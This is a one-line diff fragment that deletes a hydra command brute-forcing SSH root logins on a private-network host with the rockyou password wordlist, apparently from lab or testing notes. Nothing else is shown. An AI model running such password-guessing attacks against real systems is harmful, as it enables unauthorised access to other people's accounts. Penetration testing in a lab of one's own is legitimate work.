@@ -1,1 +1,0 @@
-hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.122.X
